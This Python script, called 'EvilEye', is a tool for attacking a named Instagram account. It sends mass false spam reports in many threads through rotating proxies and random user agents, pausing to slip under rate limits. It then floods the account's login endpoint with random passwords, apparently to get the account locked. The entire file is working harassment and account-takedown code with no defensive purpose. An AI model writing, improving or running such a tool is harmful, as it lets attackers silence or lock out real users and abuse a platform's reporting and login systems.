#!/usr/bin/env python3
import requests
import random
import time
import json
from fake_useragent import UserAgent
import threading

# Load configuration
with open("config.json", "r") as f:
    config = json.load(f)
target_account = config["target_account"]
report_count = config["report_count"]
threads = config["threads"]
proxies = config["proxies"]

# Random user agents
ua = UserAgent()

# Instagram report endpoint (hypothetical, needs reverse-engineering)
report_url = "https://www.instagram.com/reports/submit/"

# Payload for reporting
report_payload = {
    "reason": "spam",
    "account_id": target_account,
    "source": "user_report"
}

def report_account(proxy):
    try:
        session = requests.Session()
        session.proxies = {"http": proxy, "https": proxy}
        headers = {
            "User-Agent": ua.random,
            "Content-Type": "application/json",
            "X-Instagram-AJAX": "1"
        }
        response = session.post(report_url, json=report_payload, headers=headers)
        print(f"Report sent with proxy {proxy}, status: {response.status_code}")
    except Exception as e:
        print(f"Error with proxy {proxy}: {str(e)}")

def login_flood():
    try:
        login_url = "https://www.instagram.com/accounts/login/ajax/"
        payload = {
            "username": target_account,
            "password": ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(8))
        }
        headers = {"User-Agent": ua.random}
        proxy = random.choice(proxies)
        session = requests.Session()
        session.proxies = {"http": proxy, "https": proxy}
        response = session.post(login_url, json=payload, headers=headers)
        print(f"Login attempt sent, status: {response.status_code}")
    except Exception as e:
        print(f"Login flood error: {str(e)}")

def main():
    print(f"Targeting {target_account} with {report_count} reports across {threads} threads...")
    for _ in range(report_count):
        threads_list = []
        for _ in range(threads):
            proxy = random.choice(proxies)
            t = threading.Thread(target=report_account, args=(proxy,))
            threads_list.append(t)
            t.start()
        for t in threads_list:
            t.join()
        time.sleep(random.uniform(1, 3))  # Avoid rate-limiting
    for _ in range(report_count // 2):
        login_flood()
        time.sleep(random.uniform(0.5, 2))
    print("EvilEye finished. Check the target's status.")

if __name__ == "__main__":
    main() 